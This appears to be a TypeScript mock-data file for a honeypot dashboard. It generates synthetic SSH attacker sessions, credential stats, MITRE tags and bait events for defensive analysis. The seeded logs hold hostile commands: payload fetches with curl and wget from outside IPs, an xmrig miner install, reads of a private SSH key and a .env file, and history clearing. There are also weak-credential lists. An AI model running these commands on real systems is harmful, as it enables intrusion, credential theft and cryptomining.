import type {
  ExportCommand,
  ExportCommandsResponse,
  ExportSession,
  HoneypotStats,
  LLMProviderListing,
  PolicySummary,
  RuntimeConfig,
  SensorList,
  SessionDetail,
  SessionsResponse,
  SessionSummary,
  ValiditySummary,
} from "./types";

const DAY = 86_400_000;
const NOW = Date.now();

function rng(seed: number) {
  let s = seed >>> 0;
  return () => {
    s = (s * 1_664_525 + 1_013_904_223) >>> 0;
    return s / 4_294_967_296;
  };
}

const pick = <T,>(r: () => number, xs: readonly T[]): T => xs[Math.floor(r() * xs.length)];

const HOURLY = [
  6412, 5981, 5744, 5602, 5810, 6033, 6488, 7120, 7684, 7903, 7621, 7288, 7011,
  6842, 6690, 6774, 7005, 7332, 7590, 7418, 7106, 6851, 6603, 6455,
];

const BANNERS = [
  "SSH-2.0-libssh_0.9.6",
  "SSH-2.0-Go",
  "SSH-2.0-OpenSSH_7.4",
  "SSH-2.0-PUTTY_Release_0.70",
  "SSH-2.0-paramiko_2.9.2",
  "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4",
] as const;

const PREFIXES = [
  "45.148.10", "218.92.0", "103.77.204", "192.241.216", "141.98.11",
  "80.94.95", "159.65.140", "45.9.148", "5.188.206", "61.177.173",
  "222.186.30", "112.85.42", "91.240.118", "185.156.73", "194.26.29",
  "92.63.197", "176.111.173", "45.129.14", "20.51.192", "34.83.12",
  "13.229.44", "51.79.144", "139.59.32", "165.22.51", "178.128.22",
  "206.189.44", "167.71.13", "128.199.90", "209.97.170", "77.83.36",
] as const;

const USERNAMES = ["root", "admin", "support", "ubuntu", "user", "test", "oracle", "pi", "git", "deploy"] as const;

const CLASSES = ["automated_scanner", "script_kiddie", "manual_recon", "apt"] as const;

const OUTCOMES = ["auth_failed", "clean_disconnect", "timeout", "connection_reset"] as const;

const TECHNIQUES: Record<string, string[]> = {
  automated_scanner: ["T1110", "T1110.001"],
  script_kiddie: ["T1110", "T1078", "T1105"],
  manual_recon: ["T1110", "T1078", "T1082", "T1016"],
  apt: ["T1110", "T1078", "T1552.001", "T1070.003"],
};

export const stats: HoneypotStats = {
  total_sessions: 153_361,
  unique_ips: 1824,
  sessions_last_24h: 5150,
  sessions_last_7d: 31_204,
  top_ips: [
    { ip: "45.148.10.87", count: 3211 },
    { ip: "218.92.0.112", count: 2874 },
    { ip: "45.148.10.91", count: 2109 },
    { ip: "80.94.95.238", count: 1743 },
    { ip: "141.98.11.24", count: 1188 },
    { ip: "61.177.173.52", count: 986 },
  ],
  top_usernames: [
    { username: "root", count: 41_882 },
    { username: "admin", count: 9114 },
    { username: "support", count: 3402 },
    { username: "ubuntu", count: 2871 },
    { username: "user", count: 2244 },
    { username: "test", count: 1806 },
  ],
  top_passwords: [
    { password: "123456", count: 8813 },
    { password: "admin", count: 5402 },
    { password: "root", count: 4188 },
    { password: "password", count: 3117 },
    { password: "support", count: 1904 },
  ],
  top_credentials: [
    { username: "support", password: "support", count: 549 },
    { username: "admin", password: "admin", count: 431 },
    { username: "root", password: "root", count: 388 },
    { username: "ubuntu", password: "ubuntu", count: 274 },
    { username: "root", password: "123456", count: 219 },
    { username: "user", password: "user", count: 198 },
    { username: "test", password: "test", count: 154 },
    { username: "oracle", password: "oracle", count: 141 },
  ],
  ssh_banners: [
    { banner: BANNERS[0], count: 63_185 },
    { banner: BANNERS[1], count: 36_500 },
    { banner: BANNERS[2], count: 17_483 },
    { banner: BANNERS[3], count: 9355 },
    { banner: BANNERS[4], count: 6594 },
    { banner: BANNERS[5], count: 5674 },
  ],
  coordinated_ips: [
    {
      count: 9,
      ips: [
        "45.148.10.87", "45.148.10.88", "45.148.10.91", "45.148.10.94",
        "45.148.10.97", "45.148.10.99", "45.148.11.2", "45.148.11.7", "45.148.11.11",
      ],
      username: "support",
      credential: "support",
      ssh_client_banner: BANNERS[0],
      window_start_ms: NOW - 3 * DAY,
    },
    {
      count: 7,
      ips: [
        "141.98.11.24", "141.98.11.31", "141.98.11.38", "141.98.11.44",
        "141.98.11.52", "141.98.11.60", "141.98.11.71",
      ],
      username: "admin",
      credential: "admin",
      ssh_client_banner: BANNERS[0],
      window_start_ms: NOW - 5 * DAY,
    },
    {
      count: 6,
      ips: [
        "218.92.0.112", "218.92.0.117", "218.92.0.124", "218.92.0.131",
        "218.92.0.140", "218.92.0.155",
      ],
      username: "root",
      credential: "123456",
      ssh_client_banner: BANNERS[1],
      window_start_ms: NOW - 8 * DAY,
    },
    {
      count: 5,
      ips: ["80.94.95.238", "80.94.95.241", "80.94.95.244", "80.94.95.250", "80.94.95.253"],
      username: "ubuntu",
      credential: "ubuntu",
      ssh_client_banner: BANNERS[0],
      window_start_ms: NOW - 10 * DAY,
    },
    {
      count: 4,
      ips: ["103.77.204.19", "103.77.204.23", "103.77.204.31", "103.77.204.40"],
      username: "root",
      credential: "root",
      ssh_client_banner: BANNERS[4],
      window_start_ms: NOW - 13 * DAY,
    },
    {
      count: 2,
      ips: ["192.241.216.203", "192.241.216.209"],
      username: "test",
      credential: "test",
      ssh_client_banner: BANNERS[1],
      window_start_ms: NOW - 16 * DAY,
    },
  ],
  hourly_distribution: HOURLY.map((count, hour) => ({ hour, count })),
};

interface Seed {
  id: string;
  ip: string;
  cls: string;
  sev: string;
  conf: number;
  cluster: string;
  cmds: number;
  bait: number;
  durMs: number;
  offsetMin: number;
  banner: string;
  outcome: string;
  username: string;
  mitre: string[];
  summary: string;
  actions: string[];
  log: { c: string; o?: string; bait?: string; delay?: number }[];
}

const SEEDS: Seed[] = [
  {
    id: "s_8f3ac41e9b27",
    ip: "45.148.10.87",
    cls: "apt",
    sev: "critical",
    conf: 0.9,
    cluster: "c_017",
    cmds: 5,
    bait: 3,
    durMs: 401_000,
    offsetMin: 34,
    banner: BANNERS[5],
    outcome: "clean_disconnect",
    username: "root",
    mitre: TECHNIQUES.apt,
    summary:
      "Hands-on operator. In on the first credential, enumerated the host, read and copied the seeded private key, then cleared the shell history behind them.",
    actions: [
      "Block 45.148.10.87 at the edge",
      "Rotate anything resembling the bait key",
      "Check peer sensors for the same cluster",
    ],
    log: [
      { c: "uname -a", o: "Linux ubuntu 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux", delay: 4200 },
      { c: "cat /etc/passwd", o: "root:x:0:0:root:/root:/bin/bash\ndeploy:x:1000:1000::/home/deploy:/bin/bash", delay: 6100 },
      { c: "ls -la /root/.ssh", o: "-rw------- 1 root root 1679 Mar 14 09:22 id_rsa", bait: "private key · read", delay: 8800 },
      { c: "cat /root/.ssh/id_rsa", o: "-----BEGIN OPENSSH PRIVATE KEY-----", bait: "private key · copied", delay: 3100 },
      { c: "history -c", delay: 12_400 },
    ],
  },
  {
    id: "s_2b91de70c144",
    ip: "103.77.204.19",
    cls: "manual_recon",
    sev: "high",
    conf: 0.7,
    cluster: "c_004",
    cmds: 4,
    bait: 1,
    durMs: 128_000,
    offsetMin: 61,
    banner: BANNERS[2],
    outcome: "clean_disconnect",
    username: "admin",
    mitre: TECHNIQUES.manual_recon,
    summary:
      "Human cadence, looking only. Enumerated hardware and network, opened one bait config, left without dropping anything.",
    actions: ["Watch for return connections from this /24", "No containment needed"],
    log: [
      { c: "whoami", o: "root", delay: 2400 },
      { c: "nproc", o: "4", delay: 5200 },
      { c: "cat /etc/nginx/nginx.conf", o: "user www-data;\nworker_processes auto;", bait: "config · read", delay: 9100 },
      { c: "ip a", o: "2: eth0: <BROADCAST,MULTICAST,UP> inet 10.0.0.4/24", delay: 7400 },
    ],
  },
  {
    id: "s_c740ab8e5312",
    ip: "192.241.216.203",
    cls: "script_kiddie",
    sev: "high",
    conf: 0.7,
    cluster: "c_022",
    cmds: 3,
    bait: 0,
    durMs: 51_000,
    offsetMin: 88,
    banner: BANNERS[0],
    outcome: "connection_reset",
    username: "root",
    mitre: TECHNIQUES.script_kiddie,
    summary:
      "A miner toolkit run with a little interaction. Tried a package install and an outbound fetch; both refused.",
    actions: ["Block at the edge", "Add the fetch URL to the blocklist feed"],
    log: [
      { c: "curl -sL http://45.9.148.99/x.sh", o: "bash: curl: command not found", delay: 620 },
      { c: "apt-get install -y xmrig", o: "bash: apt-get: command not found", delay: 540 },
      { c: "nproc", o: "4", delay: 710 },
    ],
  },
  {
    id: "s_5e0f8c1a77b3",
    ip: "218.92.0.112",
    cls: "automated_scanner",
    sev: "medium",
    conf: 0.7,
    cluster: "c_001",
    cmds: 2,
    bait: 0,
    durMs: 9000,
    offsetMin: 102,
    banner: BANNERS[1],
    outcome: "timeout",
    username: "root",
    mitre: TECHNIQUES.automated_scanner,
    summary: "Two commands 40ms apart — well under human reaction time. No payload.",
    actions: ["None — background noise"],
    log: [
      { c: "echo -e '\\x63\\x64'", o: "cd", delay: 40 },
      { c: "cat /proc/cpuinfo", o: "model name: Intel(R) Xeon(R) CPU E5-2680 v4", delay: 38 },
    ],
  },
  {
    id: "s_9a13f6d2e805",
    ip: "45.148.10.91",
    cls: "automated_scanner",
    sev: "low",
    conf: 0.8,
    cluster: "c_017",
    cmds: 0,
    bait: 0,
    durMs: 3000,
    offsetMin: 118,
    banner: BANNERS[0],
    outcome: "auth_failed",
    username: "support",
    mitre: TECHNIQUES.automated_scanner,
    summary:
      "Four usernames in three seconds, none on the list. Same banner and credential set as campaign cluster c_017.",
    actions: ["None — already tracked as a campaign member"],
    log: [],
  },
  {
    id: "s_66c2b90741af",
    ip: "141.98.11.24",
    cls: "script_kiddie",
    sev: "medium",
    conf: 0.7,
    cluster: "c_009",
    cmds: 3,
    bait: 1,
    durMs: 77_000,
    offsetMin: 145,
    banner: BANNERS[4],
    outcome: "clean_disconnect",
    username: "admin",
    mitre: TECHNIQUES.script_kiddie,
    summary: "A scripted dropper staging into /tmp. Read one bait environment file on the way past.",
    actions: ["Block at the edge", "Sample the staged filename for the IOC feed"],
    log: [
      { c: "cd /tmp", delay: 880 },
      { c: "cat /var/www/app/.env", o: "DB_PASSWORD=hunter2_prod", bait: "env file · read", delay: 1120 },
      { c: "wget http://185.7.33.2/b", o: "bash: wget: command not found", delay: 960 },
    ],
  },
  {
    id: "s_31d8e5074c6b",
    ip: "80.94.95.238",
    cls: "automated_scanner",
    sev: "low",
    conf: 0.8,
    cluster: "c_001",
    cmds: 0,
    bait: 0,
    durMs: 2000,
    offsetMin: 163,
    banner: BANNERS[1],
    outcome: "auth_failed",
    username: "ubuntu",
    mitre: TECHNIQUES.automated_scanner,
    summary: "One credential, immediate disconnect on rejection.",
    actions: ["None — background noise"],
    log: [],
  },
  {
    id: "s_b52907ea3f18",
    ip: "159.65.140.77",
    cls: "manual_recon",
    sev: "medium",
    conf: 0.7,
    cluster: "c_013",
    cmds: 3,
    bait: 0,
    durMs: 202_000,
    offsetMin: 191,
    banner: BANNERS[3],
    outcome: "timeout",
    username: "deploy",
    mitre: TECHNIQUES.manual_recon,
    summary: "Long pauses between commands. Enumerated users and interfaces, never escalated.",
    actions: ["Watch for return connections"],
    log: [
      { c: "w", o: "10:14:22 up 47 days, 1 user, load average: 0.08, 0.12, 0.09", delay: 21_000 },
      { c: "last -5", o: "deploy pts/0 10.0.0.9 Tue Aug 26 18:02 still logged in", delay: 34_000 },
      { c: "netstat -tulpn", o: "tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 812/sshd", delay: 28_500 },
    ],
  },
];

const startOf = (s: Seed) => NOW - s.offsetMin * 60_000;

let generated: ExportSession[] | null = null;

function buildCorpus(): ExportSession[] {
  const r = rng(20_260_827);
  const out: ExportSession[] = SEEDS.map((s) => ({
    session_id: s.id,
    node_id: "Ubuntu",
    client_ip: s.ip,
    ssh_client_banner: s.banner,
    start_ms: startOf(s),
    end_ms: startOf(s) + s.durMs,
    duration_ms: s.durMs,
    outcome: s.outcome,
    command_count: s.cmds,
    bait_hit_count: s.bait,
    attacker_class: s.cls,
    classifier_confidence: s.conf,
    cluster_id: s.cluster,
    mitre_techniques: s.mitre,
    auth_attempt_count: s.outcome === "auth_failed" ? 4 : 1,
    unique_usernames_tried: s.outcome === "auth_failed" ? 4 : 1,
    top_username: s.username,
  }));

  for (let i = 0; i < 640; i++) {
    const prefix = pick(r, PREFIXES);
    const ip = `${prefix}.${2 + Math.floor(r() * 250)}`;

    const roll = r();
    const cls =
      roll > 0.985 ? "apt" : roll > 0.94 ? "manual_recon" : roll > 0.85 ? "script_kiddie" : "automated_scanner";

    const shell = cls !== "automated_scanner" || r() > 0.85;
    const cmds = shell ? 1 + Math.floor(r() * (cls === "apt" ? 24 : cls === "manual_recon" ? 12 : 7)) : 0;
    const bait = cls === "apt" ? 1 + Math.floor(r() * 3) : shell && r() > 0.82 ? 1 : 0;

    const outcome = !shell
      ? r() > 0.12
        ? "auth_failed"
        : "timeout"
      : pick(r, OUTCOMES.slice(1));

    const durMs = shell ? 8000 + Math.floor(r() * 400_000) : 1000 + Math.floor(r() * 9000);
    const start = NOW - Math.floor(r() * 30 * DAY);

    out.push({
      session_id: `s_${(0x1000_0000 + i * 7919).toString(16)}${Math.floor(r() * 0xffff).toString(16).padStart(4, "0")}`,
      node_id: "Ubuntu",
      client_ip: ip,
      ssh_client_banner: pick(r, BANNERS),
      start_ms: start,
      end_ms: start + durMs,
      duration_ms: durMs,
      outcome,
      command_count: cmds,
      bait_hit_count: bait,
      attacker_class: cls,
      classifier_confidence: Number((0.6 + r() * 0.35).toFixed(2)),
      cluster_id: `c_${String(1 + Math.floor(r() * 24)).padStart(3, "0")}`,
      mitre_techniques: TECHNIQUES[cls],
      auth_attempt_count: 1 + Math.floor(r() * 6),
      unique_usernames_tried: 1 + Math.floor(r() * 4),
      top_username: pick(r, USERNAMES),
    });
  }

  return out.sort((a, b) => b.start_ms - a.start_ms);
}

export function exportSessions(): ExportSession[] {
  if (!generated) generated = buildCorpus();
  return generated;
}

const summaryOf = (s: ExportSession): SessionSummary => ({
  session_id: s.session_id,
  client_ip: s.client_ip,
  outcome: s.outcome,
  command_count: s.command_count,
  start_ms: s.start_ms,
  duration_ms: s.duration_ms,
  ssh_banner: s.ssh_client_banner,
});

export function sessionsPage(limit: number, offset: number): SessionsResponse {
  const all = exportSessions();
  return {
    total: all.length,
    limit,
    offset,
    sessions: all.slice(offset, offset + limit).map(summaryOf),
  };
}

export function feed(limit: number): SessionsResponse {
  return sessionsPage(limit, 0);
}

const GENERIC_LOG = [
  { c: "uname -a", o: "Linux ubuntu 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux" },
  { c: "whoami", o: "root" },
  { c: "cat /proc/cpuinfo", o: "model name: Intel(R) Xeon(R) CPU E5-2680 v4" },
  { c: "free -m", o: "Mem:  7962  1204  4310  120  2447  6398" },
  { c: "df -h", o: "/dev/vda1  40G  9.1G  29G  25% /" },
  { c: "ps aux", o: "root  812  0.0  0.2  /usr/sbin/sshd -D" },
  { c: "ls -la /tmp", o: "drwxrwxrwt 8 root root 4096 Aug 27 04:02 ." },
  { c: "crontab -l", o: "no crontab for root" },
];

export function session(id: string): SessionDetail {
  const seed = SEEDS.find((x) => x.id === id);
  const row = exportSessions().find((x) => x.session_id === id);

  if (!seed && !row) throw new Error("session not found");

  const base = row ?? {
    session_id: seed!.id,
    client_ip: seed!.ip,
    ssh_client_banner: seed!.banner,
    start_ms: startOf(seed!),
    duration_ms: seed!.durMs,
    outcome: seed!.outcome,
    command_count: seed!.cmds,
    bait_hit_count: seed!.bait,
    attacker_class: seed!.cls,
    classifier_confidence: seed!.conf,
    cluster_id: seed!.cluster,
    mitre_techniques: seed!.mitre,
    top_username: seed!.username,
    auth_attempt_count: 1,
    unique_usernames_tried: 1,
    node_id: "Ubuntu",
    end_ms: null,
  };

  const r = rng(
    [...base.session_id].reduce((a, ch) => (a * 31 + ch.charCodeAt(0)) >>> 0, 7),
  );

  const log =
    seed?.log ??
    Array.from({ length: base.command_count }, (_, i) => {
      const entry = GENERIC_LOG[i % GENERIC_LOG.length];
      const automated = base.attacker_class === "automated_scanner";
      return {
        ...entry,
        delay: i === 0 ? undefined : automated ? 40 + Math.floor(r() * 260) : 900 + Math.floor(r() * 24_000),
        bait: i > 0 && i === base.command_count - 1 && base.bait_hit_count > 0 ? "config · read" : undefined,
      };
    });

  const start = base.start_ms;
  let cursor = start + 1800;

  const commands = log.map((l, i) => {
    const delay = l.delay ?? null;
    if (delay !== null) cursor += delay;
    return {
      event_id: `${base.session_id}_c${i}`,
      sequence_number: i,
      timestamp_ms: cursor,
      inter_command_delay_ms: i === 0 ? null : delay,
      raw_input_b64: "",
      parsed_command: l.c.split(" ")[0],
      parsed_args: l.c.split(" ").slice(1),
      working_directory: "/root",
      response: l.o ?? "",
      exit_code: 0,
      response_source: (l.bait ? "bait_triggered" : "hardcoded") as SessionDetail["commands"][number]["response_source"],
      deception_action: i % 3 === 0 ? "MINIMAL" : i % 3 === 1 ? "ENRICH" : "STALL",
    };
  });

  const baitEvents = log
    .map((l, i) => ({ l, i }))
    .filter(({ l }) => Boolean(l.bait))
    .map(({ l, i }) => ({
      event_id: `${base.session_id}_b${i}`,
      timestamp_ms: commands[i]?.timestamp_ms ?? start,
      bait_id: `bait_${i}`,
      bait_type: (l.bait!.includes("key")
        ? "private_key"
        : l.bait!.includes("env")
          ? "env_file"
          : "config") as SessionDetail["bait_events"][number]["bait_type"],
      access_type: (l.bait!.includes("copied") ? "copy" : "read") as
        SessionDetail["bait_events"][number]["access_type"],
      triggered_by_command_event_id: `${base.session_id}_c${i}`,
    }));

  const attempts = Math.max(base.auth_attempt_count, 1);

  return {
    session_id: base.session_id,
    schema_version: "1.2",
    node_id: "Ubuntu",
    protocol: "ssh",
    client_ip: base.client_ip,
    client_port: 40_000 + Math.floor(r() * 20_000),
    server_port: 2222,
    ssh_client_banner: base.ssh_client_banner,
    start_ms: start,
    end_ms: start + (base.duration_ms ?? 0),
    duration_ms: base.duration_ms,
    outcome: base.outcome,
    command_count: commands.length,
    bait_hit_count: baitEvents.length,
    auth_attempts: Array.from({ length: attempts }, (_, i) => ({
      timestamp_ms: start + 400 + i * 700,
      method: "password" as const,
      username: i === attempts - 1 ? (base.top_username ?? "root") : pick(r, USERNAMES),
      credential: i === attempts - 1 ? (base.top_username ?? "root") : "123456",
      success: i === attempts - 1 && base.outcome !== "auth_failed",
    })),
    commands,
    bait_events: baitEvents,
    intelligence: {
      attacker_class: base.attacker_class,
      classifier_confidence: base.classifier_confidence,
      cluster_id: base.cluster_id,
      mitre_techniques: base.mitre_techniques,
      session_summary:
        seed?.summary ??
        `${(base.attacker_class ?? "unclassified").replace(/_/g, " ")} session from ${base.client_ip}: ${base.command_count} commands, ${base.bait_hit_count} bait interactions, ended ${base.outcome.replace(/_/g, " ")}.`,
      stix_bundle: {
        type: "bundle",
        id: `bundle--${base.session_id}`,
        objects: [
          { type: "identity", name: "MIRAGE", identity_class: "system" },
          {
            type: "observed-data",
            first_observed: new Date(start).toISOString(),
            number_observed: base.command_count,
          },
          { type: "ipv4-addr", value: base.client_ip },
        ],
      },
      severity:
        base.bait_hit_count >= 2 || base.attacker_class === "apt"
          ? "critical"
          : base.bait_hit_count >= 1 || base.command_count >= 5
            ? "high"
            : base.command_count > 0
              ? "medium"
              : "low",
      recommended_actions: seed?.actions ?? [
        base.command_count > 0 ? "Review the transcript before releasing the address" : "None — background noise",
      ],
    },
  };
}

export function commandExport(after: string | undefined, limit: number): ExportCommandsResponse {
  const withCommands = exportSessions().filter((s) => s.command_count > 0);
  const rows: ExportCommand[] = [];

  for (const s of withCommands) {
    const detail = session(s.session_id);
    for (const c of detail.commands) {
      const bait = detail.bait_events.find((b) => b.triggered_by_command_event_id === c.event_id);
      rows.push({
        event_id: c.event_id,
        session_id: s.session_id,
        sequence_number: c.sequence_number,
        timestamp_ms: c.timestamp_ms,
        inter_command_delay_ms: c.inter_command_delay_ms,
        raw_command: [c.parsed_command, ...c.parsed_args].join(" "),
        parsed_command: c.parsed_command,
        parsed_args: c.parsed_args,
        working_directory: c.working_directory,
        response: c.response,
        exit_code: c.exit_code,
        response_source: c.response_source,
        deception_action: c.deception_action,
        bait_hit: Boolean(bait),
        bait_type: bait?.bait_type ?? null,
        client_ip: s.client_ip,
        ssh_client_banner: s.ssh_client_banner,
        attacker_class: s.attacker_class,
        mitre_techniques: s.mitre_techniques,
      });
    }
    if (rows.length > 2500) break;
  }

  rows.sort((a, b) => b.timestamp_ms - a.timestamp_ms);

  const startIndex = after ? rows.findIndex((c) => c.event_id === after) + 1 : 0;
  const page = rows.slice(startIndex, startIndex + limit);

  return {
    generated_at: new Date(NOW).toISOString(),
    command_count: page.length,
    next_cursor: startIndex + limit < rows.length ? (page.at(-1)?.event_id ?? null) : null,
    commands: page,
  };
}

const RATE_BASE = [
  2.71, 2.68, 2.8, 2.75, 2.62, 2.9, 2.83, 2.77, 2.69, 2.74, 2.81, 2.88, 2.65,
  6.41, 3.02, 2.94, 2.86, 2.79, 2.72, 2.83, 2.91, 2.77, 2.68, 2.74, 2.8, 2.85,
  2.71, 2.76, 2.82, 2.79,
];

export function validity(sensor?: string): ValiditySummary {
  const name = sensor ?? "fra-01";
  const secondary = name !== "fra-01";
  const shift = secondary ? 0.4 : 0;

  return {
    sensor: name,
    computed_at: new Date(NOW - 4 * 60_000).toISOString(),
    accept_rate: RATE_BASE.map((r, i) => {
      const rate = r + shift;
      const flagged = !secondary && rate > 5;
      return {
        date: new Date(NOW - (RATE_BASE.length - 1 - i) * DAY).toISOString().slice(0, 10),
        n: 4200 + ((i * 811) % 2600),
        rate: rate / 100,
        flagged,
        ...(flagged ? { mean: 0.0274, stddev: 0.0042 } : {}),
      };
    }),
    accept_rate_flagged_days: secondary ? 0 : 1,
    field_cardinality: [
      { table: "sessions", column: "outcome", distinct_count: 5, modal_value: "auth_failed", modal_share: 0.941, baseline_modal_share: 0.937, collapsed: false },
      { table: "auth_attempts", column: "success", distinct_count: 2, modal_value: "false", modal_share: 0.972, baseline_modal_share: 0.968, collapsed: false },
      { table: "sessions", column: "ssh_client_banner", distinct_count: 87, modal_value: BANNERS[0], modal_share: 0.412, baseline_modal_share: 0.398, collapsed: false },
      { table: "sessions", column: "attacker_class", distinct_count: 4, modal_value: "automated_scanner", modal_share: 0.921, baseline_modal_share: 0.914, collapsed: false },
      { table: "commands", column: "deception_action", distinct_count: 5, modal_value: "MINIMAL", modal_share: 0.604, baseline_modal_share: 0.611, collapsed: false },
      { table: "sessions", column: "ingress_source", distinct_count: 2, modal_value: "direct", modal_share: 0.988, baseline_modal_share: 0.991, collapsed: false },
    ],
    campaign: {
      members: [
        { ip: "45.148.10.87", tier: 1, session_count: 3211 },
        { ip: "45.148.10.91", tier: 1, session_count: 2109 },
        { ip: "45.148.10.88", tier: 2, session_count: 1877 },
        { ip: "45.148.10.94", tier: 2, session_count: 1604 },
        { ip: "45.148.10.97", tier: 3, session_count: 1188 },
      ],
      excluded_candidates: ["218.92.0.112", "80.94.95.238"],
      total_campaign_sessions: 32_814,
      aggregate_all: { total_sessions: 153_361, zero_command_sessions: 149_081, zero_command_pct: 97.21 },
      aggregate_excluding_campaign: { total_sessions: 120_547, zero_command_sessions: 116_401, zero_command_pct: 96.56 },
    },
    heartbeat: {
      gaps: secondary
        ? [
            {
              start: new Date(NOW - 6 * DAY).toISOString(),
              end: new Date(NOW - 6 * DAY + 47 * 60_000).toISOString(),
              duration_seconds: 2820,
            },
          ]
        : [],
      last_heartbeat: new Date(NOW - 42_000).toISOString(),
    },
  };
}

export const sensors: SensorList = { sensors: ["fra-01", "default"], default: "fra-01" };

const providerState: LLMProviderListing = {
  configured: true,
  reachable: true,
  active: "claude-haiku",
  providers: [
    { name: "claude-haiku", kind: "anthropic", calls_24h: 412, model: "claude-haiku-4-5-20251001" },
    { name: "local-qwen", kind: "openai_compatible", calls_24h: 0, model: "qwen2.5-coder:14b" },
    { name: "gpt-4o-mini", kind: "openai_compatible", calls_24h: 87, model: "gpt-4o-mini" },
  ],
};

export const providers: LLMProviderListing = providerState;

export function setActiveProvider(name: string): LLMProviderListing {
  if (!providerState.providers.some((p) => p.name === name)) throw new Error("unknown provider");
  providerState.active = name;
  return providerState;
}

export const policy: PolicySummary = {
  window_days: 7,
  total_decisions: 4218,
  actions: [
    { name: "MINIMAL", count: 2547 },
    { name: "ENRICH", count: 903 },
    { name: "STALL", count: 411 },
    { name: "SURFACE_BAIT", count: 244 },
    { name: "FAKE_SUCCESS", count: 113 },
  ],
  recent: [
    { command: "uname -a", category: "recon", action: "ENRICH", step: 1 },
    { command: "cat /etc/passwd", category: "recon", action: "SURFACE_BAIT", step: 2 },
    { command: "ls -la /root/.ssh", category: "credential_access", action: "SURFACE_BAIT", step: 3 },
    { command: "ps aux", category: "recon", action: "MINIMAL", step: 4 },
    { command: "crontab -l", category: "persistence", action: "STALL", step: 5 },
    { command: "history -c", category: "defense_evasion", action: "FAKE_SUCCESS", step: 6 },
    { command: "cat /proc/cpuinfo", category: "recon", action: "ENRICH", step: 7 },
  ],
  shadow_mode: true,
  latency_p95_ms: 14,
  timeouts: 0,
  checkpoint: "ppo.pt",
};

export const config: RuntimeConfig = {
  deception_enabled: true,
  deception_apply_actions: false,
  llm_shell_enabled: false,
  stix_enabled: true,
  intel_use_llm: false,
  public_view: true,
  writable: false,
  limits: {
    completions_per_session: 25,
    global_rate_limit: 600,
    policy_timeout_ms: 200,
    completion_timeout_ms: 4000,
    commands_per_session: 500,
    auth_delay_ms: [500, 3000],
  },
};

export const weakCredentials = [
  "root:root",
  "root:123456",
  "admin:admin",
  "support:support",
  "ubuntu:ubuntu",
  "user:user",
  "test:test",
  "oracle:oracle",
  "pi:raspberry",
  "git:git",
];
